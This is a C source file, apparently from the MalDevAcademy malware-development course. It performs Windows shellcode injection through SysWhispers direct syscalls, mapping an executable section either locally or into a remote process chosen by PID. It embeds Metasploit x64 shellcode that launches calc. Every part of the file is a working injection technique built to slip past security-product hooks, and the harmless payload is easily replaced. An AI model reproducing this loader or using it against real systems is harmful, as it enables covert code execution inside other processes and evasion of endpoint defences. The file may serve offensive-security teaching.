// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <stdio.h>

#include "SysWhispers.h"

// comment to enable remote-injection code
//
#define LOCAL_INJECTION


#ifndef LOCAL_INJECTION
#define REMOTE_INJECTION
// change the pid to thats of the process to target
#define PROCESS_ID	21636	
#endif // !LOCAL_INJECTION

/*
SysWhispers.h - SysWhispers.c - SysWhispers-asm.x64.asm created using:
	python syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtCreateSection,NtMapViewOfSection,NtUnmapViewOfSection,NtClose,NtCreateThreadEx -o SysWhispers -v
*/

// this can be used instead of `SECTION_ALL_ACCESS` in NtCreateSection
#define SECTION_RWX (SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE)


// x64 calc metasploit shellcode 
unsigned char Payload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};


// if local injection code 
#ifdef LOCAL_INJECTION

BOOL LocalMappingInjectionViaSyscalls(IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	HANDLE				hSection = NULL;
	HANDLE				hThread = NULL;
	PVOID				pAddress = NULL;
	NTSTATUS			STATUS = NULL;
	SIZE_T				sViewSize = NULL;
	LARGE_INTEGER		MaximumSize = {
			.HighPart = 0,
			.LowPart = sPayloadSize
	};

//--------------------------------------------------------------------------	
	// allocating local map view 
	
	if ((STATUS = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	if ((STATUS = NtMapViewOfSection(hSection, (HANDLE)-1, &pAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf("[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] Allocated Address At : 0x%p Of Size : %d \n", pAddress, sViewSize);

//--------------------------------------------------------------------------	
	
	// writing the payload
	printf("[#] Press <Enter> To Write The Payload ... ");
	getchar();
	memcpy(pAddress, pPayload, sPayloadSize);
	printf("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pAddress);

//--------------------------------------------------------------------------

	// executing the payload via thread creation

	printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();
	printf("\t[i] Running Thread Of Entry 0x%p ... ", pAddress);
	if ((STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

//--------------------------------------------------------------------------

	// unmpaing the local view
	/*
	if ((STATUS = NtUnmapViewOfSection((HANDLE)-1, pAddress)) != 0) {
		printf("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	*/

	// closing the section handle
	if ((STATUS = NtClose(hSection)) != 0) {
		printf("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

#endif // LOCAL_INJECTION




// if remote injection code
#ifdef REMOTE_INJECTION

BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	HANDLE				hSection			= NULL;
	HANDLE				hThread				= NULL;
	PVOID				pLocalAddress		= NULL,
						pRemoteAddress		= NULL;
	NTSTATUS			STATUS				= NULL;
	SIZE_T				sViewSize			= NULL;
	LARGE_INTEGER		MaximumSize = {
			.HighPart = 0,
			.LowPart = sPayloadSize
	};

//--------------------------------------------------------------------------
	// allocating local map view 

	if ((STATUS = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	if ((STATUS = NtMapViewOfSection(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_READWRITE)) != 0) {
		printf("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pLocalAddress, sViewSize);

//--------------------------------------------------------------------------
	
	// writing the payload
	printf("[#] Press <Enter> To Write The Payload ... ");
	getchar();
	memcpy(pLocalAddress, pPayload, sPayloadSize);
	printf("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pLocalAddress);

//--------------------------------------------------------------------------

	// allocating remote map view 
	if ((STATUS = NtMapViewOfSection(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pRemoteAddress, sViewSize);

//--------------------------------------------------------------------------
	
	// executing the payload via thread creation
	printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();
	printf("\t[i] Running Thread Of Entry 0x%p ... ", pRemoteAddress);
	if ((STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

//--------------------------------------------------------------------------

	// unmpaing the local view
	/*
	if ((STATUS = NtUnmapViewOfSection((HANDLE)-1, pLocalAddress)) != 0) {
		printf("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	*/
	
	// closing the section handle
	if ((STATUS = NtClose(hSection)) != 0) {
		printf("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

#endif // REMOTE_INJECTION




int main() {

	// if local injection code 
#ifdef LOCAL_INJECTION
	if (!LocalMappingInjectionViaSyscalls(Payload, sizeof(Payload))) {
		return -1;
	}
#endif // LOCAL_INJECTION

	
	
	// if remote injection code
#ifdef REMOTE_INJECTION
	// open a handle to the target process
	printf("[i] Targeting process of id : %d \n", PROCESS_ID);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PROCESS_ID);
	if (hProcess == NULL) {
		printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
		return -1;
	}

	if (!RemoteMappingInjectionViaSyscalls(hProcess, Payload, sizeof(Payload))) {
		return -1;
	}

#endif // REMOTE_INJECTION


	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}
